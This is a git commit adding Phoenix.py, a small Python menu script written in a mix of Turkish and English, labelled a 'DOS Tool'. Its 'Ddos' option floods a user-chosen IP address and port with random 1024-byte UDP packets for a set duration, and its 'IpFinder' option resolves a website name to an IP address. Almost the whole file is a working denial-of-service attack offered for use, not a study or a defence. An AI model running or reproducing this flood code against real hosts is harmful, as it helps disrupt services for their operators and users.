ef59b9d898f9a1b5b1bea9b6235790250711784e
TheDevS <86555526+TheDevS-tr@users.noreply.github.com>
2021-06-27 14:36:32 +0300

    Add files via upload

---
+++ Phoenix.py
@@ -0,0 +1,43 @@
+import webbrowser
+import os
+import sys
+import time
+import socket
+import random
+	
+
+
+
+Ddos = "Ddos"
+Ipfinder = "IpFinder"
+print("1= Ddos      2= IpFinder")
+tahmin = input(">>> ")
+if tahmin == Ddos:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+
+    os.system("clear")
+    print("Welcome to DOS Tool !   -by TheDev")
+    print("")
+    ip = input("Enter target ip : ")
+    port = int(input("Enter target port : "))
+    dur = int(input("Enter duration : "))
+    timeout = time.time() + dur
+    sent = 0
+    while True:
+            try:
+                if time.time() > timeout:
+                        break
+                else:
+                        pass
+                sock.sendto(bytes, (ip, port))
+                sent = sent + 1
+                print("Sent",sent,"packets to",ip,"through",port,)
+            except KeyboardInterrupt:
+                sys.exit()
+
+if tahmin == Ipfinder:
+    print("")      
+    adrs = input("Enter the website address : ")
+    print("")
+    print("IP of the entered host is ",socket.gethostbyname(adrs))       
